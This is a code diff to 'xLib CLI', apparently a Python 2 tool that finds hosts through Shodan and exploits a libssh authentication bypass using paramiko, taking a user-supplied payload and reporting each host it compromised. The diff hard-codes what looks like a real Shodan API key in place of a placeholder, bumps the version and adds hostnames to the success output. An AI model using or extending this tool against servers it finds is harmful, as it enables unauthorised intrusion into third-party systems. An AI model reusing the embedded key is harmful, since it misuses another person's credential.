@@ -11,11 +11,11 @@ import paramiko
 import socket
 
 # // SHODAN.IO Module {setup}
-SHODAN_API_KEY = 'Your APi Key.'
+SHODAN_API_KEY = 'M4Vm4GwfgipFQJ1jjNwAGudJStlFyVnn'
 api = shodan.Shodan(SHODAN_API_KEY)
 
 print '[*] Welcome to xLib CLI. [*]'
-print '| Exploit : LIBSSH Auth Bypass | Version : 0.2.6 |'
+print '| Exploit : LIBSSH Auth Bypass | Version : 0.2.7 |'
 print '--------------------------------------------------'
 payload = raw_input('Enter payload: ')
 print '--------------------------------------------------'
@@ -40,6 +40,6 @@ try:
         except socket.error:
             print '[!] xLib Error: Box broken.'
         except paramiko.ssh_exception.SSHException:
-            print '[$] Exploited!'
+            print '[$] ' + hostname + ' Exploited!'
 except shodan.APIError, e:
     print '[-] xLib Error: pipe broke.'
